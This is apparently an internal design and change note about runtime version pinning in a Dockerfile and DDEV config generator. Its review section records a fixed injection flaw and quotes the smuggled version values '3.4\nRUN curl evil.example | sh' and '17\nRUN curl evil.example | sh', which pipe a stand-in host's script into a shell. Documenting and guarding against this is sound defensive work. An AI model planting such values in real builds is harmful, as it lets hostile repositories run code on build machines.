# patient-pinning-kernighan — runtime versions the spec can express but the generator ignores

Status: IMPLEMENTED 2026-08-23 (unit/tsc verified, NOT live-e2e — no image was built and no DDEV
project was booted from a generated config).

What shipped, against the three shapes below:

1. Go unfrozen. `DEFAULT_GO_VERSION` / `DEFAULT_RUST_VERSION` in
   `env-replicate/_shared.ts` (there, not in 02, because 02 already imports 01 and a
   back-import would be a cycle whose const-init order decides whether the worker boots).
   `versions.go` overrides it. VERIFIED against go.dev/static.rust-lang.org on the day:
   Go 1.26.7 (mature line's latest patch, not the then-five-day-old 1.27.0), Rust 1.98.0.
2. Rust no longer floats — `--default-toolchain stable` became the recorded version. A
   two-part Cargo.toml `rust-version` passes straight through (VERIFIED: channel-rust-1.98
   and -1.98.0 both resolve).
3. DDEV Node written. `renderDdevConfig` emits `nodejs_version`, gated on node being a
   DECLARED runtime (the test `nodeInspect` already uses) and on a plain numeric version.

Two findings that changed the implementation, both MEASURED rather than reasoned:

- Go release filenames are NOT uniform. `go1.26.linux-amd64.tar.gz` 404s, so taking a
  go.mod `go 1.26` verbatim would have broken every build it touched. The bare `X.Y` name
  stops at 1.20 and `X.Y.0` starts at 1.21 (go1.20 200 / go1.20.0 404 / go1.21 404 /
  go1.21.0 200) — `normalizeGoVersion` keys on that boundary.
- DDEV validates `nodejs_version` for WHITESPACE ONLY (read out of the 1.25.3 binary:
  "Node.js versions cannot contain whitespace"). A range like `^22` therefore passes DDEV
  and fails later inside the container at nvm. `package.json` engines reach this through
  sanitizeVersion, which strips `>=` but leaves `20 || ^22` intact, so the line is written
  only for `^\d+(\.\d+){0,2}$` and otherwise omitted — DDEV's own default, i.e. exactly
  today's behaviour.

Ruby is the deliberate partial. `versions.ruby` is now declared, recorded and surfaced in
the Dockerfile comment, but NOT honoured: apt ships one interpreter per suite, and naming a
package the suite lacks fails the build. The generated comment says so in as many words
rather than emitting a pin that means nothing. The version manager stays out of scope, as
below.

One defect this change would otherwise have INTRODUCED, caught on review and fixed here:
`versions.rust` and `versions.ruby` default to a repo-derived capture (`rust-version = "..."`
in Cargo.toml, `ruby '...'` in a Gemfile), and a JS negated character class matches a newline
— so a crafted file closes the quote a line later and carries its own `RUN` into the
generated Dockerfile. REPRODUCED pre-guard: the Gemfile regex returns
`3.4\nRUN curl evil.example | sh`, which rendered as a standalone RUN line. `isPlainVersion`
now gates both (Go was already safe: normalizeGoVersion rebuilds the string from numeric
parts).

`versions.node` (package.json `engines.node`) and `versions.java` (pom.xml
`<maven.compiler.source>`) were injectable identically and PRE-DATE this change; closed in
the same sweep on request. Both name their install source by MAJOR alone
(`setup_${n}.x`, `openjdk-${n}-jdk-headless`), so `isPlainMajor` gates the derived part and
falls back to the recorded default. REPRODUCED pre-guard: the pom capture `([^<]+)` returns
`17\nRUN curl evil.example | sh`, and the node line rendered as
`curl -fsSL https://deb.nodesource.com/setup_22` followed by a standalone
`RUN curl evil.example | sh`. The Java `1.8 -> 8` unwrap is preserved and tested.

`versions.php` was already safe — normalizePhpVersion strips everything but digits and dots.
Not touched, and NOT the same class: `extraPackages`, the LSP pins and the chrome-devtools
version are user-typed or admin-set rather than repo-derived, so they are the operator's own
sandbox, not a hostile clone.

`declaredDeps.versions` gains go/rust/ruby CONDITIONALLY, like `browser` and for the same
reason — the object is folded into `envTemplateHash`, so three always-present nulls would
have forked a template row and rebuilt the image of every environment on the install for no
change. VERIFIED both directions: a project declaring none of the three hashes identically;
a Go project that declares one does not.
Origin: raised 2026-08-22 while answering "how do we handle runtime versions currently?"

## Context

A task's declared dependencies carry a `versions` map, and most runtimes honour it. Three do
not, and one path silently drops the version it detected. The result is that a project can
state which runtime version it needs and get a different one, with nothing reporting the
mismatch.

MEASURED by reading `renderDockerfile` and the DDEV config handling, not inferred:

| Runtime | Versioned? | Mechanism |
|---|---|---|
| PHP (DDEV) | yes | `php_version` in `.ddev/config.yaml`, parsed and written by `01-declare-deps` / `07c-ddev-reconcile` |
| Database (DDEV) | yes | `database.kind` + `version`, same path |
| PHP (non-DDEV) | yes | `versions.php ?? '8.3'` via sury/ondrej, floored to 5.6 |
| Node (image) | major only | `versions.node ?? '22'` -> nodesource `setup_${major}.x` |
| Python | yes | `versions.python ?? '3.12'` |
| Java | major only | `versions.java ?? '17'` -> `openjdk-N-jdk-headless` |
| **Go** | **no** | hardcoded `https://go.dev/dl/go1.23.0.linux-amd64.tar.gz` |
| **Rust** | **no** | `rustup ... --default-toolchain stable` |
| **Ruby** | **no** | apt `ruby` — whatever the base suite ships |
| **Node (DDEV)** | **read, never written** | `01-env-detect` parses `nodejs_version`; nothing writes it back |

## The three shapes of the bug

They are not the same defect and should not get the same fix.

1. **Go is frozen.** `go1.23.0` is a bare literal inside a URL — not an `ARG`, so there is no
   knob and no signal that it is stale. A project needing a newer Go cannot ask for one, and
   the version silently ages further with every month that passes.
2. **Rust and Ruby drift.** `stable` and the distro package resolve to whatever exists on
   build day, so two images built weeks apart differ with no commit of ours. This is the
   failure `DDEV_VERSION` and `PUPPETEER_CORE_VERSION` are both pinned to prevent, with
   comments in those files saying exactly that.
3. **DDEV Node is dropped.** The detected `nodejs_version` informs nothing. A DDEV project
   gets whatever `ddev-webserver` ships unless the repo's own `config.yaml` already pinned it,
   in which case it survives only because Haive never rewrites that field.

Cases 1 and 2 are opposite failures — stale versus drifting — and a single "pin everything"
change would trade one for the other. Go needs a knob; Rust and Ruby need a default that is
recorded rather than resolved at build time.

## Direction, not an implementation

- Read `versions.go` / `versions.rust` / `versions.ruby` the way `versions.node`,
  `versions.python` and `versions.java` are already read, with a recorded default rather than
  a floating one, so the declared value is honoured when present and the fallback is visible
  when it is not.
- Ruby's apt package cannot express a version; a version-managed install (rbenv/ruby-build or
  a versioned PPA) is a bigger change and should be decided on its own merits rather than
  bundled in.
- For DDEV, write `nodejs_version` alongside `php_version` in the same place that already owns
  that file (`01-declare-deps`, mirrored by `07c-ddev-reconcile`'s drift check). DDEV supports
  the field; Haive simply never sets it.

## Prior art to reuse

`renderDockerfile` already has the pattern for all of this — see the node, python and java
blocks, which read `versions.<runtime>` with a default and interpolate a major. The DDEV side
already has `matchYamlField` for reading and the declare-deps writer for writing, plus
`07c-ddev-reconcile` which detects drift in the whole `.ddev` tree.

## Verification

Render a Dockerfile for each runtime with and without a declared version and assert the
version reaches the install line, in `packages/worker/test/env-dockerfile-pins.test.ts` which
already does exactly this for the LSP pins. For DDEV, assert the written `config.yaml` carries
`nodejs_version` and that `07c` does not then report it as drift.

## Out of scope

Ruby version managers, and any attempt to pin the browser — that one is not solvable by
pinning at all, see `nimble-browsing-lovelace`.
